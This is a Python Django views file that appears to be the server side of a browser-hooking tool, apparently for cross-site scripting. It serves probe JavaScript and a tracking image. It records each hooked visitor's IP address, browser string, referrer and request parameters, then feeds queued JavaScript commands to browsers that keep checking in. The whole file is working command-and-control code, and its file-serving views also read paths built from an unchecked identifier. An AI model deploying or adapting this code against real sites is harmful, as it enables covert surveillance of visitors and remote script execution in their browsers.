import os
import time
import simplejson

from django.shortcuts import render
from django.http import HttpResponse

BASEDIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))    
PROBEDIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'probe')

def now_time():
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

def to_time(timestr):
    try:
        timestr = str(timestr)
        t=time.strptime(timestr,'%Y-%m-%d %H:%M:%S')
        return time.mktime(t)
    except:
        return time.time()

def __reqisok(req):
    ua = req.META.get('HTTP_USER_AGENT', '')
    pid = req.POST.get('pid', '')
    if not pid:
        pid = req.GET.get('pid', '')
    if not pid or not pid.isalnum() or not ua:
        return 0
    return 1

def __status(pid):
    probe_js = os.path.join(PROBEDIR, '%s.js'%pid)
    probe_txt = os.path.join(PROBEDIR, '%s.txt'%pid)
    probe_cmd = os.path.join(PROBEDIR, '%s.cmd'%pid)
    probe_heartbeet = os.path.join(PROBEDIR, '%s.heartbeet'%pid)
    
    probe_existed = 0
    if os.path.exists(probe_js):
        probe_existed = 1
    
    probe_done = 0
    if os.path.exists(probe_txt):
        probe_done = 1

    probe_live = 0
    try:
        f = open(probe_heartbeet)
        c = f.read()
        f.close()
    except:
        c = ''
    if c:
        if(time.time() - to_time(c) <= 15):
            probe_live = 1

    probe_cmd_c = ''
    try:
        f = open(probe_cmd)
        c = f.read()
        f.close()
    except:
        c = ''
    if c:
        probe_cmd_c = c
    
    return {
        'pid': pid,
        'probe_existed': probe_existed,
        'probe_done': probe_done,
        'probe_live': probe_live,
        'probe_cmd_c': probe_cmd_c,
    }

def index(req):
    resp = HttpResponse('')
    return resp

def probe_status(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'Probe status fetched failed.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    
    pid = req.GET.get('pid', '')
    rnt = {'succ': 1, 'msg': 'Probe status fetched success.'}
    rnt.update(__status(pid))
    if not rnt['probe_existed']:
        rnt = {'succ': 0, 'msg': 'Probe status fetched failed.'}
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def cmd(req):
    if not __reqisok(req):
        resp = HttpResponse('alert(/test/);', content_type='application/x-javascript')
        return resp
    
    ip = req.META.get('REMOTE_ADDR','')
    ua = req.META.get('HTTP_USER_AGENT','-')
    referer = req.META.get('HTTP_REFERER','-')
    getdict = req.GET.dict()
    getstr = str(getdict)
    pid = getdict.get('pid', '')
    probe_txt = os.path.join(PROBEDIR, '%s.txt'%pid)
    probe_js = os.path.join(PROBEDIR, '%s.js'%pid)
    
    if not os.path.exists(probe_js):
        r = 'alert(/test/);'
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
        
    if not os.path.exists(probe_txt):
        c = "IP: %s\nUser-Agent: %s\nReferer: %s\n%s\n\n"%(ip, ua, referer, getstr)
        try:
            f = open(probe_txt, 'w')
            f.write(c)
            f.close()
        except:
            r = 'adad.done=0;'
            resp = HttpResponse(r, content_type='application/x-javascript')
            return resp
        r = 'adad.done=1;'
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
    else:
        probe_heartbeet = os.path.join(PROBEDIR, '%s.heartbeet'%pid)
        try:
            f = open(probe_heartbeet, 'w')
            f.write(now_time())
            f.close()
        except:
            pass
        
        probe_cmd = os.path.join(PROBEDIR, '%s.cmd'%pid)
        try:
            f = open(probe_cmd)
            c = f.read().strip()
            f.close()
        except:
            c = '' 
        try:
            if c:
                f = open(probe_cmd, 'w') # wipe
                f.write('')
                f.close()
        except:
            pass
        if not c:
            c = 'adad.heartbeet=1;' 
        
        r = c
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp

def probe_js(req, pid):
    try:
        f = open(os.path.join(PROBEDIR, '%s.js'%pid))
        c = f.read()
        f.close()
    except:
        c = 'var _js_ = "error";'
    resp = HttpResponse(c, content_type='application/x-javascript')
    return resp
    
def probe_png(req, pid):
    ip = req.META.get('REMOTE_ADDR','')
    ua = req.META.get('HTTP_USER_AGENT','-')
    referer = req.META.get('HTTP_REFERER','-')
    probe_txt = os.path.join(PROBEDIR, '%s.png.txt'%pid)
    if not os.path.exists(probe_txt):
        c = "IP: %s\nUser-Agent: %s\nReferer: %s\n\n"%(ip, ua, referer)
        try:
            f = open(probe_txt, 'w')
            f.write(c)
            f.close()
        except:
            pass
    try:
        f = open(os.path.join(PROBEDIR, '%s.png'%pid), 'rb')
        c = f.read()
        f.close()
    except:
        c = ''
    resp = HttpResponse(c, content_type='image/png')
    return resp
    
